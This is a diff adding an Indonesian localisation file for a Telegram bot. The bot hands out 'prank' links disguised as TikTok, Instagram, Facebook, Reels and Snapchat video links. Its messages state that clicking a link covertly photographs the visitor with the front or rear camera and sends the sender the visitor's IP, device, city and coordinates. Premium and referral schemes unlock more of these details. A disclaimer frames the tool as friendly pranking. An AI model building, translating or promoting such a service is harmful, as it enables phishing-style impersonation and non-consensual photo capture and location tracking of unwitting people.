@@ -1,0 +1,40 @@
+{
+    "subscription": "⛔️ <b>Untuk melanjutkan penggunaan bot, silakan berlangganan ke channel.</b>\n\n🔜 <b>Setelah berlangganan ke semua channel, kirim perintah:</b> /start",
+    "start": {
+        "text": "🎉 <b>Berikut adalah tautan prank untuk teman-temanmu:</b>\n\n➖ <b>TikTok:</b> https://tiktok.fearby.su/?video={{userToken}}{{mode}}\n\n➖ <b>Instagram:</b> https://instagram.fearby.su/?video={{userToken}}{{mode}}\n\n➖ <b>Facebook:</b> https://facebook.fearby.su/?video={{userToken}}{{mode}}\n\n➖ <b>Reels:</b> https://reels.fearby.su/?video={{userToken}}{{mode}}\n\n➖ <b>Snapchat:</b> https://snapchat.fearby.su/?video={{userToken}}{{mode}}\n\n📸 <b>Setelah temanmu mengklik tautan — kamu akan menerima foto mereka!</b>\n\n{{cameraText}}",
+        "keyboard": {
+            "getPremium": "🏆 Langganan Premium",
+            "privacy": "🎭 Privasi",
+            "sharelink": "🔗 Kirim ke Teman",
+            "changeCamera": "📟 Ganti Kamera"
+        },
+        "frontCamera": "📟 <b>Bot akan mengambil foto dengan kamera depan</b>",
+        "rearCamera": "📟 <b>Bot akan mengambil foto dengan kamera belakang</b>"
+    },
+    "commandNotFound": "❗️Perintah tidak ditemukan.",
+    "back": "◀️ Kembali",
+    "privacy": "🎭 <b>Privasi.</b>\n\n1) Penggunaan bot diperbolehkan hanya untuk tujuan prank, pendidikan, atau eksperimen.\n2) Dilarang membagikan tautan kepada orang asing — ini dapat mengakibatkan pemblokiran.\n3) Bot dan situs terkait hanya menyimpan informasi minimal tentang pengguna: ID mereka, bahasa, dan status langganan Premium.\n4) Bot tidak menyimpan foto pengguna: foto-foto tersebut dikirim melalui situs ke file sementara dan segera dikirimkan ke penerima akhir.\n5) Dilarang keras membagikan tautan dengan permintaan yang melanggar aturan Telegram atau hukum di negara Anda (dan negara lain yang memiliki perundang-undangan yang beradab).\n6) Sistem pengaduan diterapkan di dalam bot: jika foto yang diterima melanggar aturan, foto tersebut dapat dikirim untuk ditinjau, dan jika pelanggaran dikonfirmasi, IP pengirim akan diblokir.\n7) Bot dibuat untuk prank persahabatan dan lelucon ringan, bukan untuk tujuan hacking atau pengungkapan identitas. Hormati pengguna lain dan ruang pribadi mereka.\n\n<b>Dengan menggunakan bot, Anda setuju dengan aturan ini. Pelanggaran dapat mengakibatkan pemblokiran.</b>",
+    "newPhoto": "❗️<b>Foto diterima melalui tautanmu.</b>\n\n🌐 <b>IP:</b> <code>{{ip}}</code>\n📱 <b>Perangkat:</b> <code>{{platform}}</code>\n🌃 <b>Kota:</b> <code>{{location}}</code>\n📍 <b>Koordinat:</b> <code>{{coordinates}}</code>\n\n{{premium}}",
+    "complaint": "⛔️ Ajukan Keluhan",
+    "complaintSent": "☑️ Keluhan berhasil dikirim!",
+    "paymentSent": "🎉 <b>Pembayaran berhasil diterima!</b>",
+    "hide": "tersembunyi",
+    "premiumSuccess": "🏆 <b>Pengguna Premium akan membuka semua informasi tersembunyi dan banyak lagi.</b>",
+    "premium": {
+        "text": "🏆 <b>Keuntungan Premium!</b>\n\n1) Pilihan kamera untuk foto. (depan atau belakang)\n2) Detail informasi dalam pesan (yang tersembunyi)\n3) Tidak ada batasan\n\n🔑 <i>Langganan dibayar selama 24 jam.</i>",
+        "keyboard": {
+            "pay": "⭐ Bayar langganan",
+            "getForFree": "👥 Dapatkan gratis"
+        }
+    },
+    "referral": {
+        "text": "👥 <b>Ruang Rujukan.</b>\n\n  • <b>Total diundang:</b> <code>{{invitesCounter}}</code>\n  • <b>Poin:</b> <code>{{points}}</code>\n\n🔗 <b>Tautan Anda:</b> <code>https://t.me/{{BOTNAME}}?start={{tgId}}</code>\n\n👉 Undang teman-teman dan dapatkan poin yang nantinya bisa ditukar dengan langganan premium.\n\n<b>Setelah Anda mengundang 10 teman, Anda dapat menukarkan poin dengan langganan premium.</b>",
+        "keyboard": {
+            "exchange": "♻️ Tukar dengan langganan"
+        }
+    },
+    "exchange": {
+        "text": "🎊 <b>Anda telah berhasil menukarkan poin untuk langganan selama 24 jam!</b>",
+        "enoughtPoints": "😢 Poin tidak cukup. Ajak lebih banyak teman!"
+    }
+}
